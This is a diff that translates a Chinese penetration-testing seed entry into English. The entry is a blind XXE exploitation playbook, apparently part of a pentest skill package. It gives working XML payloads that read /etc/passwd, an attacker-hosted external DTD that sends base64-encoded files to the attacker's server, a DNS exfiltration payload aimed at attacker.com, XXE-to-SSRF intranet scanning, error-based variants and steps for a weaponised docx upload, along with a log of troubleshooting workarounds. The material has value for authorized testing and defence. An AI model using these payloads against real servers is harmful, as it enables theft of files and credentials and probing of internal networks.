@@ -1,55 +1,55 @@
-# [种子] XXE 盲注 OOB → 外带 /etc/passwd 与内网探测
+# [Seed] XXE Blind Injection OOB → Takeaway /etc/passwd and Intranet Detection
 
-## 场景分类
-渗透测试 / Web 漏洞利用
+## Scene classification
+Penetration Testing/Web Exploitation
 
-## 目标概述
-某 Web 接口接受 XML 请求体（SOAP / 上传 docx 解析 / 自定义 API），不回显内容（即"盲 XXE"）。利用外部 DTD + 参数实体技巧把目标文件外带回攻击者服务器。
+## Goal Overview
+A certain web interface accepts XML request body (SOAP/upload docx parsing/custom API) without echoing the content (i.e. "blind XXE"). Use the external DTD + parameter entity trick to bring the target file back to the attacker's server.
 
-## 完整执行链路
+## Complete execution link
 
-1. 探测点
-   - 任何 Content-Type 含 `xml` / `soap` / 文件上传 docx/xlsx/pptx（含 XML）/ SVG
-   - 注入测试 payload 后看响应：报错 / 时延 / OOB 回连
-2. 首先试有回显的简单 XXE
-   ```xml
-   <?xml version="1.0"?>
-   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
-   <r>&x;</r>
-   ```
-3. 无回显但 OOB 通 → 用外部 DTD
-   - 在自己 VPS 上放 evil.dtd
-   - 触发服务器加载并外带
-4. OOB 也不通 → 看是否能用 error-based / blind boolean
-5. 拿到 /etc/passwd 后扩展面：
-   - 内网端口扫描（XXE → SSRF）
-   - 读应用配置文件（数据库密码 / 私钥）
-   - 触发 SSRF 打云元数据 → 见 seed-006
+1. Detection point
+- Any Content-Type including `xml` / `soap` / File upload docx/xlsx/pptx (including XML) / SVG
+- Inject the test payload and check the response: error / delay / OOB connection back
+2. First try a simple XXE with echo
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<r>&x;</r>
+```
+3. No echo but OOB pass → Use external DTD
+- Put evil.dtd on your VPS
+- Trigger server loading and takeout
+4. OOB is also not working → See if error-based / blind boolean can be used
+5. Expand the surface after getting /etc/passwd:
+- Intranet port scanning (XXE → SSRF)
+- Read application configuration file (database password/private key)
+- Trigger SSRF cloud metadata → see seed-006
 
-## 踩坑记录
+## Trampling on pit records
 
-| 问题 | 原因 | 解决方案 | 耗时 |
+| Problem | Cause | Solution | Time consuming |
 |------|------|---------|------|
-| 直接 SYSTEM "file://" 报错 | 解析器禁用了 ENTITY 引用 | 改用参数实体 (%) 嵌套 | 30min |
-| 文件含 `<` `>` `&` 导致 DTD 解析爆炸 | XML 规范禁止参数实体里有特殊字符 | 用 `php://filter` 包一层 base64 | 40min |
-| OOB 服务器 80 端口收到回连但 payload 没拼接好 | DTD 嵌套层数搞错 | 严格对照 OOB 模板（外层 + 内层） | 1h |
-| 文件读取了但只读到一半 | XML 限制实体长度（XML_MAX_TOKEN_BYTES） | 分段读取 + 偏移 | 1h |
-| 内网 SSRF 全是 connection refused | 应用所在网段没开内部服务 | 改 localhost / 127.0.0.1 / 内部 service 名（K8s） | 30min |
-| Java 应用打不通 | Java 默认 XML 解析器禁了 SYSTEM | 试 `jar:` 协议 / 或换 SOAP 接口可能用的是 Apache Xerces 老版本 | 数小时 |
+| Direct SYSTEM "file://" error | The parser has disabled ENTITY references | Use parameter entity (%) nesting instead | 30min |
+| File contains `<` `>` `&` causing DTD parsing explosion | XML specification prohibits special characters in parameter entities | Use `php://filter` to wrap a layer of base64 | 40min |
+| OOB server port 80 receives a return connection but the payload is not spliced | The number of DTD nesting levels is wrong | Strictly control the OOB template (outer layer + inner layer) | 1h |
+| File read but only half read | XML limit entity length (XML_MAX_TOKEN_BYTES) | Fragmented read + offset | 1h |
+| Intranet SSRF is all connection refused | The network segment where the application is located does not have internal services | Change localhost / 127.0.0.1 / internal service name (K8s) | 30min |
+| Java application cannot be connected | Java default XML parser has disabled SYSTEM | Try `jar:` protocol / or change the SOAP interface. You may be using an old version of Apache Xerces | A few hours |
 
-## 工具链发现
+## Toolchain discovery
 
-- **XXEinjector** 自动化 XXE 利用（Ruby）
-- **Burp Collaborator** / **interactsh** 是 OOB 必备
-- **dnslog.cn / oast.online** 国内/国外 DNS-only OOB
-- 上传文件场景：**docx 是 zip + xml**，把 word/document.xml 改了再压缩回去就能注入
-- **payloads-all-the-things** XXE 章节是最全 cheatsheet
+- **XXEinjector** Automated XXE exploits (Ruby)
+- **Burp Collaborator** / **interactsh** are a must for OOB
+- **dnslog.cn / oast.online** Domestic/foreign DNS-only OOB
+- Upload file scenario: **docx is zip + xml**, change word/document.xml and then compress it back to inject it
+- **payloads-all-the-things** XXE chapter is the most complete cheatsheet
 
-## 关键代码/命令
+## Key code/command
 
-OOB 标准两层 DTD（内带 base64 文件外带）：
+OOB standard two-layer DTD (with base64 file inside and outside):
 
-**evil.dtd（放在攻击者 VPS）**：
+**evil.dtd (placed on attacker VPS)**:
 
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
@@ -57,7 +57,7 @@ OOB 标准两层 DTD（内带 base64 文件外带）：
 %all;
 ```
 
-**目标请求体**：
+**Target request body**:
 
 ```xml
 <?xml version="1.0"?>
@@ -69,23 +69,23 @@ OOB 标准两层 DTD（内带 base64 文件外带）：
 <r>any</r>
 ```
 
-**攻击者起 HTTP 服务收数据**：
+**The attacker starts the HTTP service to collect data**:
 
 ```bash
 python3 -m http.server 8000
-# 收到 GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
+# Received GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
 echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
 # → root:x:0:0:root:/root:/bin/bash
 ```
 
-XXE → SSRF 内网扫描：
+XXE → SSRF intranet scan:
 
 ```xml
 <!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
 <r>&x;</r>
 ```
 
-错误回显（error-based）—— 让 XML 解析器在错误信息里返回内容：
+Error echo (error-based) - Let the XML parser return content in the error message:
 
 ```xml
 <!DOCTYPE r [
@@ -97,65 +97,65 @@ XXE → SSRF 内网扫描：
 <r>x</r>
 ```
 
-**docx 上传 XXE**（很多文档处理类应用受影响）：
+**docx upload XXE** (many document processing applications are affected):
 
 ```bash
 unzip target.docx -d unpacked/
-# 编辑 unpacked/word/document.xml，把开头改成：
+# Edit unpacked/word/document.xml, change the beginning to:
 # <?xml version="1.0"?>
 # <!DOCTYPE w:document [...XXE payload...]>
 zip -r evil.docx unpacked/*
-# 上传 evil.docx
+# Upload evil.docx
 ```
 
-## 对本包的改进建议
+## Suggestions for improving this package
 
-- `pentest-tools/references/web-attack-cheatsheet.md` 应该有 XXE 完整章节（OOB / error / blind / docx upload / svg）
-- bootstrap manifest 增加 interactsh-client（如果还没）
-- routing 已含 XXE，但建议显式加"XXE OOB 外带"路由
+- `pentest-tools/references/web-attack-cheatsheet.md` should have XXE complete chapters (OOB/error/blind/docx upload/svg)
+- Add interactsh-client to bootstrap manifest (if not already)
+- routing already contains XXE, but it is recommended to explicitly add "XXE OOB out-of-band" routing
 
-## 可复用的模式/脚本片段
+## Reusable patterns/script snippets
 
-**XXE 类型决策树**：
+**XXE type decision tree**:
 
 ```text
-有回显     → 直接 SYSTEM "file://" 出
-报错有回显 → error-based payload（嵌套两层 + 故意触发解析失败）
-全无回显   → OOB 标准两层 DTD（DNS / HTTP）
-DNS 通 HTTP 不通 → 用 DNS exfil（base32 编码后做子域）
+There is an echo → Directly output SYSTEM "file://"
+The error report is echoed → error-based payload (two levels of nesting + intentional triggering of parsing failure)
+No echo at all → OOB standard two-layer DTD (DNS / HTTP)
+DNS is accessible but HTTP is not accessible → Use DNS exfil (base32 encoded to make subdomain)
 ```
 
-**XXE 协议清单（按解析器测试）**：
+**XXE protocol list (tested by parser)**:
 
 ```text
-file://          → 读本地文件（最常见）
+file:// → read local files (most common)
 http://, https:// → SSRF
-ftp://           → 老版本 Java 也支持
-gopher://        → 极少数 PHP 解析器
-expect://        → PHP 安装 expect 扩展时可命令执行
-jar://           → Java 解压远程 jar 中文件
-netdoc://        → 老版本 Java 替代 file://
+ftp:// → Older versions of Java also support
+gopher:// → very few PHP parsers
+expect:// → PHP can execute the command when installing the expect extension
+jar:// → Java decompresses files in remote jar
+netdoc:// → old version of Java instead of file://
 ```
 
-**DNS exfil（最弱通道）**：
+**DNS exfil (weakest channel)**:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
 %eval;
 %ext;
-<!-- DNS log 收到 hostname.attacker.com -->
+<!-- DNS log received hostname.attacker.com -->
 ```
 
-## 进化动作
-- [ ] web-attack-cheatsheet.md 增加 XXE 完整章节
-- [ ] bootstrap-manifest 检查 interactsh-client
-- [x] routing 已含 XXE 入口
+## Evolution action
+- [ ] web-attack-cheatsheet.md Added XXE complete chapter
+- [ ] bootstrap-manifest check interactsh-client
+- [x] routing already contains XXE entry
 
-## 环境信息
-- 攻击者 VPS（公网 IP，开放 80/8000/53）
-- 目标: 任何接受 XML 输入的 Web（PHP/Java/Python lxml/.NET 都受影响）
-- OOB: interactsh / dnslog.cn / 自建 DNS
+## Environment information
+- Attacker VPS (public IP, open 80/8000/53)
+- Target: Any web that accepts XML input (PHP/Java/Python lxml/.NET are affected)
+- OOB: interactsh / dnslog.cn / self-built DNS
 
-## 脱敏要求
-本条目为种子数据，基于公开 Web 漏洞利用模式编写，不涉及真实生产目标。所有域名/IP 为占位符。
+## Desensitization requirements
+This entry is seed data, written based on public web vulnerability exploitation patterns, and does not involve real production targets. All domain names/IPs are placeholders.
